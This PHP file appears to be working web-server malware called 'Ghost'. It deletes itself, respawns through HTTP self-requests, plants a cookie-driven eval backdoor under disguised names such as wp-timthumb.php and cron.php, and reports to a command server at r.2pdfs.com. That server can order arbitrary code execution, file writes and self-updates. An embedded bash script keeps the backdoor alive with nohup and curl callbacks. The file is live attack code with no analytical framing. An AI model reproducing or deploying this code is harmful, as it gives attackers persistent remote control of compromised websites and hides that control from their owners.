<?php

define('DEBUG', preg_match('#\.dev$#', $_SERVER['HTTP_HOST']));
define('VERSION', 1);
define('INTERVAL', 2);
define('MAX_TIME', DEBUG ? 60 : 3600);
define('PING_EVERY', DEBUG ? 30 : 600);
define('LOGFILE', '/tmp/ghost-' . $_SERVER['HTTP_HOST'] . '.log');
define('PROTOCOL', "http" . (isset($_SERVER['HTTPS']) ? "s" : ""));

ignore_user_abort(true);
set_time_limit(MAX_TIME);
ini_set('max_execution_time', MAX_TIME);

function get_my_location() {
	return preg_replace('@\(.*\(.*$@', '', __FILE__);
}

function my_sleep($seconds) {
	usleep($seconds * 1000000);
}

function log_msg($message) {
	if (! DEBUG) return;
	file_put_contents(LOGFILE, $message . "\n", FILE_APPEND);
}

function fix_slashes($path) {
	return str_replace("\\", "/", $path);
}

function path_to_url($path) {
	$urlpath = str_replace(get_doc_root(), '', $path);
	return PROTOCOL . "://" . $_SERVER["HTTP_HOST"] . $urlpath;
}

function get_doc_root() {
	$name = fix_slashes($_SERVER['SCRIPT_NAME']);
	$filename = fix_slashes($_SERVER['SCRIPT_FILENAME']);
	$res = str_replace($name, '', $filename);
	return rtrim($res, '/');
}

function scan_writable_dirs($dir) {
	$dirs = glob($dir . '/*', GLOB_ONLYDIR);
	$started_at = microtime(true);

	$result = array();

	if (!$dirs) return $result;

	foreach ($dirs as $dir) {
		if (is_writable($dir)) {
			$result[] = $dir;
		}

		$result = array_merge(scan_writable_dirs($dir), $result);

		if (count($result) > 1000) return $result;
		if (microtime(true) - $started_at > 2) return $result;
	}

	return $result;
}

class ServerClient {
	private $ch;
	private $host;

	public function __construct($ch, $host) {
		$this->ch = $ch;
		$this->host = $host;
	}

	private function do_request($path, $data) {
		log_msg("Request $path");
		foreach ($data as $key => $value) log_msg("  $key: $value");

		$data['host'] = $_SERVER['HTTP_HOST'];
		curl_setopt($this->ch, CURLOPT_TIMEOUT, 1);
		curl_setopt($this->ch, CURLOPT_URL, $this->host . $path);
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, json_encode($data));
		return curl_exec($this->ch);
	}

	public function tell_backdoor_changed($path) {
		$this->do_request('/backdoor', array(
			'new_backdoor' => $path,
			'location' => path_to_url($path),
		));
	}

	public function log_error($string) {
		$this->do_request('/error', array('message' => $string));
	}

	public function log_message($string) {
		$this->do_request('/message', array('message' => $string));
	}

	public function ping() {
		return $this->do_request('/ping', array('version' => VERSION));
	}

	public function getHost() {
		return $this->host;
	}
}

class Payload
{
	private $id;
	private $written_to;

	/** @var  ServerClient */
	private $server_client;

	public function __construct($id, $server_client, $written_to) {
		$this->id = $id;
		$this->server_client = $server_client;
		$this->written_to = $written_to;
	}

	private function check_backdoor() {
		if (!file_exists($this->written_to)) return false;
		return file_get_contents($this->written_to) == $this->get_backdoor_code();
	}

	private function get_backdoor_code() {
		return '<?php extract($_COOKIE);@$W(@$X($Y,$Z));';
	}

	private function write_backdoor() {
		$doc_root = get_doc_root();
		$writable = scan_writable_dirs($doc_root);
		$dirs = array($writable[array_rand($writable)], $doc_root);

		$filenames = array('wp-timthumb.php', 'cron.php', 'sitemap.php', 'resize.php');

		foreach ($dirs as $dir) {
			$filename = $filenames[array_rand($filenames)];
			$path = $dir . "/" . $filename;
			$written = file_put_contents($path, $this->get_backdoor_code());
			if (!$written) log_msg("Could not write to $path");
			$url = path_to_url($path);
			log_msg("Wrote to $path $url");
			if (! $this->check_backdoor_working($url)) continue;
			$this->written_to = $path;
			return $path;
		}

		$this->server_client->log_error("Could not write backdoor anywhere");
		return '';
	}

	private function check_backdoor_working($url) {
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0");
		curl_setopt($ch, CURLOPT_COOKIE, "W=call_user_func;X=create_function;Y=;Z=" . rawurlencode('print(strtoupper("amworking"));'));
		$resp = curl_exec($ch);
		curl_close($ch);

		if (false !== strpos($resp, 'AMWORKING')) return true;

		log_msg("Backdoor not working");

		return false;
	}

	private function get_backdoor_path() {
		if (!$this->written_to) {
			$this->write_backdoor();
		}

		if (!$this->check_backdoor()) {
			$this->write_backdoor();
		}

		return $this->written_to;
	}

	public function work() {
		log_msg("Doing shit $this->id " . time());

		$backdoor_was = $this->written_to;
		$path = $this->get_backdoor_path();

		if ($path != $backdoor_was) {
			$this->server_client->tell_backdoor_changed($path);
		}
	}

	public function get_extra_headers() {
		if ($this->written_to) {
			return array("X-Path: " . $this->written_to);
		} else {
			return array();
		}
	}
}

class Ghost
{
	private $started_at;

	/** @var  Payload */
	private $payload;

	/** @var  ServerClient */
	private $server_client;

	private $own_code;

	private $bash_ghost;

	public function __construct($payload, $server_client, $own_code, $bash_ghost) {
		$this->payload = $payload;
		$this->server_client = $server_client;
		$this->own_code = $own_code;
		$this->bash_ghost = $bash_ghost;
	}

	private function write_myself() {
		$dest = get_my_location();

		$wrote = file_put_contents($dest, $this->own_code);

		if ($wrote) return $dest;

		$this->server_client->log_error("Could not write self to $dest");

		$writable_dirs = scan_writable_dirs(get_doc_root());

		if (count($writable_dirs) == 0) {
			$this->server_client->log_error("No writable dirs");
			return false;
		}

		$dest = $writable_dirs[array_rand($writable_dirs)] . '/' . substr(md5(rand()), 0, 6) . '.php';

		$written = file_put_contents($dest, $this->own_code);

		if (! $written) {
			$this->server_client->log_error("Could not write self to $dest");
			return false;
		}

		// todo: curl check the path runs scripts
		$this->server_client->log_message("Written self to $dest");
		return $dest;
	}

	private function start_myself($extra_headers) {
		$file = $this->write_myself();

		if (! $file) {
			$this->server_client->log_error("Could not start myself");
			return false;
		}

		$extra_headers = array_merge($extra_headers, $this->payload->get_extra_headers());

		log_msg("Starting myself");

		$ch = curl_init(path_to_url($file));
		curl_setopt($ch, CURLOPT_TIMEOUT, 1);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $extra_headers);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0");
		curl_exec($ch);
		curl_close($ch);

		return true;
	}

	private function get_ts_file() {
		return '/tmp/' . substr(md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])), 0, 10);
	}

	private function get_first_file() {
		return $this->get_ts_file() . '.first';
//		return '/tmp/' . substr(md5(gethostname()), 0, 10);
	}

	private function check_other_not_running() {
		$ts_file = $this->get_ts_file();

		if (! file_exists($ts_file)) return;

		$seen_ago = time() - file_get_contents($ts_file);

		if ($seen_ago >= INTERVAL * 3) return;

		$this->server_client->log_message("Other instance seen $seen_ago seconds ago in $ts_file");
		exit();
	}

	private function is_ts_script_running($my_file) {
		if (! file_exists($my_file)) return false;

		$data = file_get_contents($my_file);

		list(, $last_seen) = explode(":", $data);

		$seen_ago = time() - $last_seen;

		$this->server_client->log_message("Found other ts file $my_file on same server $data. Seen ago $seen_ago");

		if ($seen_ago >= 3) return false;

		$this->server_client->log_message("Starting myself without writing ts file");

		return true;
	}

	private function start_other_write_ts() {
		$this->check_other_not_running(); // make sure there isn't another alive script

		if (DEBUG) @unlink(LOGFILE); // for debug

		$my_file = $this->get_first_file();
		log_msg("Writing to $my_file - " . time());

		$is_other_running = $this->is_ts_script_running($my_file);

		my_sleep(3.4); // some time for the second script to check that this one has died. fractional to prevent empty ts file reading

		if (! $is_other_running) file_put_contents($my_file, $this->started_at . ":" . time());

		$this->start_myself(array(
			'X-STARTED-AT: ' . $this->started_at
		));

		while (! $is_other_running) {
			my_sleep(1);

			file_put_contents($my_file, $this->started_at . ":" . time());
			echo 'x'; // some output

			if (DEBUG && time() - $this->started_at > MAX_TIME) exit();
		}
	}

	private function try_read_lived_for() {
		$watched_file = $this->get_first_file();
		$now = time();
		$last_seen_info = false;

		for ($i = 0; $i < 100; $i++) {
			$last_seen_info = file_get_contents($watched_file);
			if ($last_seen_info) break;
			my_sleep(0.001);
		}

		if (! $last_seen_info) {
			$this->server_client->log_message("Bad last seen info: " . file_get_contents($watched_file));
		}

		log_msg("Last seen $watched_file $last_seen_info $now");

		list($started_at, $last_seen) = explode(":", $last_seen_info);

		if ($now - $started_at < 2 || $now - $last_seen < 2) {
			log_msg("Still alive");
			return false;
		}

		$lived_for = $last_seen - $started_at;
		log_msg("Died. Lived for $lived_for");

		if ($lived_for < 6) {
			$this->server_client->log_error("Bad lived for $lived_for in $watched_file $last_seen_info $now");
			return 30;
		}

		$this->server_client->log_message("Lived for set to $lived_for");

		return $lived_for;
	}

	private function try_run_bash() {
		$disabled = explode(',', ini_get('disable_functions'));
		$disabled = array_map('trim', $disabled);
		if (in_array('exec', $disabled)) return false;

		if (! exec('which curl; uname -a', $output)) return false;

		$this->server_client->log_message("Exec worked: " . implode('. ', $output));

		$dest = '/tmp/' . md5(rand());

		if (! file_put_contents($dest, $this->bash_ghost)) {
			$this->server_client->log_message("Could not write bash to $dest");
			return false;
		}

		$docroot = get_doc_root();
		$host = $_SERVER['HTTP_HOST'];
		$server = $this->server_client->getHost();
		exec("SERVER=$server DOMAIN=$host DOCROOT=\"$docroot\" nohup bash < $dest > /dev/null 2>&1 &");

		unlink($dest);

		echo "BASH_RUN";

		return true;
	}

	public function run() {
		if ($this->try_run_bash()) return;

		$this->started_at = time();

		foreach ($_SERVER as $key => $value) {
			if (0 !== strpos($key, 'HTTP_X')) continue;
			log_msg("X header $key $value");
		}

		if (!isset($_SERVER['HTTP_X_LIVED_FOR']) && !isset($_SERVER['HTTP_X_STARTED_AT'])) {
			$this->server_client->log_message("Starting");
			$this->start_other_write_ts();
			exit();
		}

		$lived_for = @$_SERVER['HTTP_X_LIVED_FOR'];

		$stopfile = get_doc_root() . '/stop.php';
		$prev_running_for = false;

		while (true) {
			if (!$lived_for) {
				$lived_for = $this->try_read_lived_for();
			}

			if ($lived_for) {
				$i_lived_for = time() - $this->started_at;

				if ($lived_for && $lived_for - $i_lived_for < 5) { // < 5 seconds till this script will be forced to die
					$started = $this->start_myself(array(
						'X-LIVED-FOR: ' . $lived_for,
						'X-STARTED-AT: ' . $_SERVER['HTTP_X_STARTED_AT']
					));

					if ($started) exit();

				}
			}

			file_put_contents($this->get_ts_file(), time()); // prevent duplicate instances
			echo 'x'; // some output

			$this->payload->work();

			$running_for = time() - $_SERVER['HTTP_X_STARTED_AT'];

			if ($prev_running_for && floor($running_for / PING_EVERY) != floor($prev_running_for / PING_EVERY)) {
				$this->touch_server();
			}

			if (file_exists($stopfile)) {
				$this->server_client->log_message("Stopping because of stopfile");
				unlink($stopfile);
				break;
			}

			$prev_running_for = $running_for;
			my_sleep(1);
		}
	}

	private function touch_server() {
		$text = $this->server_client->ping();

		$response = json_decode($text, true);

		if ($response === NULL) {
			$this->server_client->log_error("Bad ping response $text");
			return;
		}

		if (isset($response['run_func'])) {
			log_msg("Running " . $response['run_func']);
			// WARNING: super dangerous - wrong function will stop script
			call_user_func(create_function('', $response['run_func']));
		}

		if (isset($response['file_data'])) {
			log_msg("Writing " . $response['file'] . ": " . $response['file_data']);
			file_put_contents(get_doc_root() . $response['file'], $response['file_data']);
		}

		if (isset($response['new_file_code'])) {
			$this->server_client->log_message("Replacing my code with version from server. My version " . VERSION);
			$this->own_code = $response['new_file_code'];
		}
	}
}

$my_location = get_my_location();
$my_code = file_get_contents($my_location);

$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

$bash_ghost = <<<EOF
#!/bin/bash

BACKDOOR_FILE='<?php extract(\$_COOKIE);@\$W(@\$X(\$Y,\$Z));'
PIDFILE=/tmp/\$( echo \$DOMAIN | md5sum | cut -c1-16 )

cd /

function rand() {
 tr " " "\\n" <<< \$@ | shuf | head -n1
}

function call_server {
 curl -s -X POST --data "host=\$DOMAIN" \$SERVER\$@ > /dev/null
}

function write_backdoor() {
 DEST=\$( find \$DOCROOT -type d -writable | shuf | head -n1 )/\$( rand wp-timthumb.php cron.php sitemap.php resize.php )
 echo "WRITING 2 \$DEST"
 echo "\$BACKDOOR_FILE" > \$DEST # maybe: check backdoor working with curl
 LOCATION=http://\$DOMAIN\${DEST/\$DOCROOT/}
 call_server /backdoor --data "new_backdoor=\$DEST" --data "location=\$LOCATION"
}

function check_backdoor {
 [[ ! -z "\$DEST" ]] && [[ -e "\$DEST" ]] && [[ \$(< \$DEST) == "\$BACKDOOR_FILE" ]] && echo "all ok" && return

 write_backdoor
}

function ping { # maybe: support running stuff depending on reply from server
 call_server /ping
}

[[ -e \$PIDFILE ]] && [[ -e /proc/\$(< \$PIDFILE ) ]] && echo "Already running" && exit

echo \$BASHPID > \$PIDFILE

while true; do
 check_backdoor
 ping

 sleep 600
done
EOF;

$server_client = new ServerClient($ch, "https://r.2pdfs.com");

$runid = substr(md5(rand()), 0, 2);
$payload = new Payload($runid, $server_client, @$_SERVER['HTTP_X_PATH']);
$ghost = new Ghost($payload, $server_client, $my_code, $bash_ghost);

if (! getenv('NORUN')) {
	@unlink($my_location);
	$ghost->run();
}
